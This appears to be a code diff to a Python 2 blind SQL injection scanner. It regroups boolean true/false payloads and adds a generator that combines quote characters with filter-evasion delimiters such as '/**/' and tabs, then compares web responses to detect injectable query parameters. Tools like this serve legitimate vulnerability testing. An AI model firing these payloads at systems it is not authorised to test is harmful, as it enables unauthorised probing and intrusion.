@@ -27,26 +27,62 @@ TrueFalsePayload1 = (
     '" or 9999;-- ',
     '" and 0;-- '
 )
-TrueFalsePayload = (
+TrueFalsePayload2 = (
     #Single quotes
-    "' and 7777='7777",
+    ("' and 7777='7777",
     "' and 0='0",
     "' or 9999='9999",
-    "' and 7777='7788",
+    "' and 7777='7788"),
 
     #numeric
-    " and 7777=7777",
+    (" and 7777=7777",
     " and 0=0",
     " or 9999=9999",
-    " and 7777=7778",
+    " and 7777=7778"),
 
     #double quotes
-    '" and 7777="7777',
+    ('" and 7777="7777',
     '" and 0="0',
     '" or 7777="7777',
-    '" and 7777="7778'
+    '" and 7777="7778')
+)
+PayloadTuple = (
+    "%s%sand%s%s7777%s=%s7777",
+    "%s%sand%s%s0%s=%s0",
+    "%s%sor%s%s9999%s=%s9999",
+    "%s%sand%s%s7777%s=%s7778",
+)
+Quote=(
+    "'",
+    '"',
+    ''
+)
+Delimiter=(
+    '+',
+    '\t',
+    '/**/',
+    '\n'   
 )
 
+def get_payload_list():
+    payloadList = []
+    for j in Delimiter:
+        for i in Quote:
+            tmp = []
+            for k in PayloadTuple:
+                s = k%(i,j,j,i,i,i)
+                tmp.append(s)
+            payloadList.append(tmp)
+    return payloadList
+
+TrueFalsePayload = get_payload_list()
+for i in range(len(TrueFalsePayload)):
+    print "\nGroup:%d\n"%(i)
+    for j in TrueFalsePayload[i]:
+        print j
+    print '\n' 
+print "PayloadList:",TrueFalsePayload
+#TrueFalsePayload = TrueFalsePayload2
 class BSqliRspDiff():
     def __init__(self, req, eq_limit=0.98):
         self._req = copy.deepcopy(req)
@@ -70,11 +106,11 @@ class BSqliRspDiff():
     def response_diff(self):
         req = self._req
         #true/false response comparison
-        for i in range(0,len(TrueFalsePayload)/4):
-            trueStm1 = TrueFalsePayload[i*4]
-            trueStm2 = TrueFalsePayload[i*4+1]
-            trueStm3 = TrueFalsePayload[i*4+2]
-            falseStm = TrueFalsePayload[i*4+3]
+        for i in range(0,len(TrueFalsePayload)):
+            trueStm1 = TrueFalsePayload[i][0]
+            trueStm2 = TrueFalsePayload[i][1]
+            trueStm3 = TrueFalsePayload[i][2]
+            falseStm = TrueFalsePayload[i][3]
             
             trueQueryList1=request.get_payload_query_list(req._query,trueStm1)
             trueQueryList2=request.get_payload_query_list(req._query,trueStm2)
@@ -107,10 +143,11 @@ class BSqliRspDiff():
                     print "\n*******************************"
                     print "**Find bsqli in:"
                     print "!!!!!!!!!!!url:",self._req._url
+                    print "*payload:",falseStm
                     print "*cleanRsp:",cleanRsp
                     print "*payloadRsp:",payloadRsp
                     print "*******************************\n"
-                    return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TrueFalsePayload[i*4:i*4+4])
+                    return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TrueFalsePayload[i])
                 else:
                     tmpReq5 = copy.deepcopy(req)
                     tmpReq6 = copy.deepcopy(req)
@@ -123,10 +160,11 @@ class BSqliRspDiff():
                         print "\n*******************************"
                         print "* Find bsqli in:"
                         print "!!!!!!!!!url:",self._req._url
+                        print "*payload:",falseStm
                         print "*cleanRsp:",cleanRsp
                         print "*orRsp:",orRsp
                         print "*******************************\n"                                       
-                        return result.Result([tmpReq1,tmpReq2,tmpReq5,tmpReq6],[rsp1,rsp2,rsp5,rsp6],TrueFalsePayload[i*4:i*4+4]) 
+                        return result.Result([tmpReq1,tmpReq2,tmpReq5,tmpReq6],[rsp1,rsp2,rsp5,rsp6],TrueFalsePayload[i]) 
 
 
 def start(req): 
